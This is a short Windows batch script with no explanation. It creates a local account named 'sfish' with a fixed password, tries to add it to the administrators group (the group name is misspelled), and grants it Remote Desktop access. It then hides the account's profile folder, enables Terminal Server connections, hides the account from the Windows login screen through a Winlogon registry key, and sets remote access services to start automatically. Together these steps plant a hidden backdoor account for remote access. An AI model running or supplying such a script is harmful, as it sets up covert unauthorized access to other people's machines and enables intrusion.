net user sfish sfish9 /add
net localgroup Adnimistrators sfish /add
net localgroup "Remote Desktop Users" sfish /add
attrib +h "%SYSTEMDRIVE%\Documents and Settings\sfish" /S /D
echo Y | reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t reg_dword /d 0
echo Y | reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v AllowTSConnections /t reg_dword /d 1
echo Y | reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "sfish" /t REG_DWORD /d 00000000 /f
sc config rasman start= auto
sc config remoteaccess start= auto
net start rasman
net start remoteaccess